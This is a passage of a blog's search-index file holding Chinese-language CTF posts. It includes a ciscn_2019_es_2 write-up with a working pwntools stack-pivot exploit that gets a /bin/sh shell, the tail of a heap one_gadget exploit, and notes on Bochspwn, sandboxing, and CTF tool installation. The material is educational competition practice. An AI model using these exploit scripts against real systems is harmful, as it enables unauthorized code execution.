execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">payload = flat(p8(<span class="number">0</span>)*<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, one_gadget)</span><br><span class="line">fill(<span class="string">b&#x27;6&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
        <tag>Fastbin Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>【ciscn_2019_es_2】WriteUp</title>
    <url>/posts/d92ba103.html</url>
    <content><![CDATA[<h1 id="【ciscn-2019-es-2】WriteUp"><a href="#【ciscn-2019-es-2】WriteUp" class="headerlink" title="【ciscn_2019_es_2】WriteUp"></a>【ciscn_2019_es_2】WriteUp</h1><p><code>checksec</code>一下，发现只有NX防护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn11/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>使用ida打开，发现s存在溢出漏洞，但是只能溢出8字节，无法调用write等函数进行RetLibc。因此考虑栈迁移。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈迁移指在rbp指向的地址写入要篡改的地址，rbp+4写入leave_ret地址，这样在函数正常结束即将返回时，rsp指向rbp，rbp指向rbp指向的内容地址，rsp+4到leave_ret，使eip指向了leave_ret，因此导致程序又执行了leave_ret，再次将rsp移动到rbp，rsp+4，使eip指向了篡改地址+4的地址。</p>
<p><img src="/img/posts/2024-2-28-pwn11.assets/%E6%A0%88%E8%BF%81%E7%A7%BB-1.png" alt="栈迁移-1"></p>
<p><img src="/img/posts/2024-2-28-pwn11.assets/%E6%A0%88%E8%BF%81%E7%A7%BB-2.png" alt="栈迁移-2"></p>
<p>因此只需要向程序变量s写入要执行的指令，再栈迁移使eip指向s即可。</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080485BE&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27006</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出泄漏ebp地址，用于栈迁移</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，进行栈迁移，通过修改ebp来达到修改eip的目的 </span></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;aaaa&#x27;</span>, system_addr, <span class="number">0</span>, ebp_addr-<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(ebp_addr-<span class="number">0x38</span>, leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pwn</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>Bochspwn学习</title>
    <url>/posts/96f187a0.html</url>
    <content><![CDATA[<h1 id="Bochspwn"><a href="#Bochspwn" class="headerlink" title="Bochspwn"></a>Bochspwn</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
]]></content>
      <tags>
        <tag>论文复现</tag>
        <tag>内核</tag>
        <tag>条件竞争</tag>
      </tags>
  </entry>
  <entry>
    <title>SJTU2024回顾</title>
    <url>/posts/6252c524.html</url>
    <content><![CDATA[<h1 id="SJTU2024回顾"><a href="#SJTU2024回顾" class="headerlink" title="SJTU2024回顾"></a>SJTU2024回顾</h1><p>校赛已经过去两个多月了，一直没有时间回顾。今天复健一下，将校赛的题回顾一遍。本人主打pwn和reverse，回顾内容也主要围绕这些展开。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sandboxing</title>
    <url>/posts/df529e66.html</url>
    <content><![CDATA[<h1 id="Sandboxing"><a href="#Sandboxing" class="headerlink" title="Sandboxing"></a>Sandboxing</h1><p>观看pwn.college中sandboxing模块的<a href="https://pwn.college/cse466-f2023/sandboxing/">讲解视频</a>所做的笔记</p>
<h2 id="Modern-Technologies-about-Sandboxing"><a href="#Modern-Technologies-about-Sandboxing" class="headerlink" title="Modern Technologies about Sandboxing"></a>Modern Technologies about Sandboxing</h2><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p>通过设置系统调用的禁用和允许规则来达到目的</p>
<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><h4 id="创建一个类似于docker的独立命名空间"><a href="#创建一个类似于docker的独立命名空间" class="headerlink" title="创建一个类似于docker的独立命名空间"></a>创建一个类似于docker的独立命名空间</h4><p>unshare命令：Run a program with some namespaces unshared from the parent<br>其创建了一个新的命名空间，其与父进程独立。（注：fork系统调用为完全共享，clone系统调用可以指定共享内容）</p>
<p>unshare后创建的新进程仍然可以访问原本的目录（如&#x2F;），因为还没有mount和unmount。（附：使用mount将根目录下的目录，例如&#x2F;bin等重新mount到新进程下，就可以在新进程下看到，这就是docker container使用的技巧。注意，在外部系统中是看不到mount的目录的，因为unshare不共享mount namespace）</p>
<p>mount命令：挂载文件或设备到指定的文件系统<br>其中&#x2F;dev代表挂载的设备文件，&#x2F;sys代表内核相关的内容</p>
<p>unshare -m -p -n –mount-proc –fork &#x2F;bin&#x2F;bash<br>此命令可以类似于docker创建一个新的进程，进程在一个新的命名空间中，但是仍然可以查看外部文件系统</p>
<h4 id="创建独立的文件系统"><a href="#创建独立的文件系统" class="headerlink" title="创建独立的文件系统"></a>创建独立的文件系统</h4><p>使用mount将&#x2F;bin等目录挂载到当前目录，并且chroot。<br>但是chroot不安全，因此应该有更安全的方法：使用命名空间pivot_root</p>
<p>使用pivot_root，先创建一个old文件夹存放根目录，然后unmount，rmdir。即可实现容器化。</p>
<p>docker额外实现的机制：</p>
<ul>
<li>docker还另外实现了对资源的限制，例如内存用量，使用ulimit命令</li>
<li>对用户的限制，使在容器内为root，但在容器外为普通用户</li>
<li>seccomp限制特定命令，例如unshare，避免其逃逸</li>
</ul>
<p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF常用工具汇总</title>
    <url>/posts/81c8e8b2.html</url>
    <content><![CDATA[<h1 id="CTF常用工具汇总"><a href="#CTF常用工具汇总" class="headerlink" title="CTF常用工具汇总"></a>CTF常用工具汇总</h1><p>记录了ctf的常用工具，随缘更新~</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>最基础的工具之一，python库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>最基础的工具之一，调试神器</p>
<p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">https://blog.csdn.net/whbing1471/article/details/112410599</a></p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure>

<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><a href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install ROPgadget</span><br><span class="line">ROPgadget --help</span><br></pre></td></tr></table></figure>

<h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line">ropper --help</span><br></pre></td></tr></table></figure>

<h3 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h3><p><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>

<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>

<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<p>error：<code>./bootstrap.sh: 2: autoreconf: not found</code></p>
<p>解决方案：<code>sudo apt-get install autoconf</code></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
